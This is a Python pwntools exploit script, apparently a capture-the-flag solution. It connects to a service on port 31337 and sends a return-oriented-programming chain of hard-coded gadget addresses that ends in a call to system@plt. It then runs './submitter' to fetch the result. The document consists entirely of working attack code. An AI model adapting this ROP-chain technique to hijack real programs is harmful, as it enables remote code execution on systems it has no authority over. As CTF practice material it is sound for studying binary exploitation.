#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

io = remote(HOST, int(PORT))

sla = lambda x, y: io.sendlineafter(x, y)
sa = lambda x, y: io.sendafter(x, y)
sl = lambda x: io.sendline(x)
s = lambda x: io.send(x)
rv = lambda x: io.recv(x)
rvu = lambda x: io.recvuntil(x)
rvl = lambda : io.recvline()
ia = lambda : io.interactive()

U64 = lambda x: u64(x.ljust(8, b'\x00'))
U32 = lambda x: u32(x.ljust(4, b'\x00'))
U16 = lambda x: u16(x.ljust(2, b'\x00'))
U8 = lambda x: u8(x.ljust(1, b'\x00'))

n64 = lambda x: (x + (1 << 64)) & ((1 << 64) - 1)
n32 = lambda x: (x + (1 << 32)) & ((1 << 32) - 1)
n16 = lambda x: (x + (1 << 16)) & ((1 << 16) - 1)
n8 = lambda x: (x + (1 << 8)) & ((1 << 8) - 1)

def send_addrs(addrs):
    for addr in addrs:
        sla(b'Addr pls: ', str(addr).encode())

# pop r12 ; pop rbp ; ret
pop_r12_rbp = 0x401797
# mov rax, r12 ; pop rbx ; pop r12 ; pop rbp ; ret
mov_rax_r12 = 0x469407
# pop rdi ; pop rbp ; ret
pop_rdi_rbp = 0x402218
# add rax, rdi ; ret
add_rdi_rax = 0x471885
# ret
ret_addr = 0x471888
system_addr =0x401914

addrs = [400000000] * 4
addrs += [401797, 10060, 1] # pop r12 ; pop rbp ; ret
addrs += [469407, 1, 1, 1] # mov rax, r12 ; pop rbx ; pop r12 ; pop rbp ; ret
addrs += [402218, 490499, 1] # pop rdi ; pop rbp ; ret
addrs += [471885] # add rdi, rax ; ret
addrs += [471888] # ret
addrs += [401914] # system@plt
addrs += [0]
send_addrs(addrs)

sl(b'./submitter')
log.info(rv(200))
# ia()